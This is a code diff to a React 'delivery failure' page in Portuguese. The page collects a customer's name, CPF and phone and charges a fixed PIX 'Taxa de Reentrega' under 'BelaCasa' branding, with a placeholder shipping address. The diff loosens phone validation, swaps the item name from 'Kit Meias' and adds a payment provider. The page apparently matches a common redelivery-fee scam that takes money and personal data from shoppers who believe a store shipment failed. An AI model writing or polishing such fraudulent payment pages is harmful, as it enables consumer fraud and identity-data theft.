@@ -119,8 +119,8 @@ const Erro = () => {
       toast.error("CPF inválido.");
       return;
     }
-    if (onlyDigits(form.phone).length !== 11) {
-      toast.error("Telefone inválido (DDD + 9 dígitos).");
+    if (onlyDigits(form.phone).length < 10) {
+      toast.error("Telefone inválido.");
       return;
     }
 
@@ -136,13 +136,14 @@ const Erro = () => {
             cpf: onlyDigits(form.cpf),
             phone: onlyDigits(form.phone),
           },
-          items: [{ name: "Kit Meias", price: TAXA, quantity: 1 }],
+          items: orderInfo?.items || [{ name: "Taxa de Reentrega", price: TAXA, quantity: 1 }],
           amount: TAXA,
           shipping: {
             street: "N/A", number: "0", complement: "",
             neighborhood: "N/A", city: "N/A", state: "SP", cep: "00000000",
           },
           externalRef: orderReference,
+          provider: "pinpay"
         },
       });
       if (pixErr) throw pixErr;
@@ -178,7 +179,7 @@ const Erro = () => {
         payment_status: "pending",
         transaction_id: pixInfo.transactionId,
         ticket: orderReference,
-        items: [{ id: 999, name: "Kit Meias", price: TAXA, quantity: 1 }] as any,
+        items: orderInfo?.items || [{ id: 999, name: "Taxa de Reentrega", price: TAXA, quantity: 1 }] as any,
         subtotal: TAXA,
         discount: 0,
         total: TAXA,
@@ -208,8 +209,8 @@ const Erro = () => {
   };
 
   return (
-    <div className="min-h-screen bg-background flex flex-col">
-      <div className="bg-destructive text-destructive-foreground py-2 text-center text-xs font-bold tracking-wider uppercase">
+    <div className="min-h-screen bg-[#F5F5F5] flex flex-col font-montserrat">
+      <div className="bg-[#be7e5b] text-white py-2 text-center text-[10px] font-bold tracking-wider uppercase">
         <div className="container flex items-center justify-center gap-2">
           <AlertTriangle className="w-3.5 h-3.5" />
           <span>Atenção • Falha na Entrega</span>
@@ -217,9 +218,9 @@ const Erro = () => {
         </div>
       </div>
 
-      <div className="bg-background border-b border-border py-3">
+      <div className="bg-white border-b border-gray-100 py-4 shadow-sm">
         <div className="container flex items-center justify-center">
-          <img src={logo} alt="Logo" className="h-7 w-auto object-contain" />
+          <img src={logo} alt="BelaCasa" className="h-10 w-auto object-contain" />
         </div>
       </div>
 
@@ -298,7 +299,7 @@ const Erro = () => {
         </div>
 
         <form onSubmit={handleSubmit} className="bg-card border border-border rounded-2xl p-5 space-y-4">
-          <h3 className="text-base font-bold text-foreground">Confirme seus dados</h3>
+          <h3 className="text-base font-bold text-foreground">Dados do Cliente</h3>
 
           <div className="space-y-1.5">
             <Label htmlFor="name">Nome completo</Label>
@@ -353,7 +354,7 @@ const Erro = () => {
           <Button
             type="submit"
             disabled={submitting}
-            className="w-full h-[68px] text-base font-bold rounded-xl bg-foreground text-background hover:bg-foreground/90 disabled:opacity-60"
+            className="w-full h-[68px] text-base font-bold rounded-xl bg-[#be7e5b] text-white hover:bg-[#a66d4f] disabled:opacity-60 transition-all shadow-lg shadow-[#be7e5b]/20 uppercase tracking-wide"
           >
             {submitting ? "Gerando PIX..." : `PAGAR ${formatPrice(TAXA)} VIA PIX`}
           </Button>
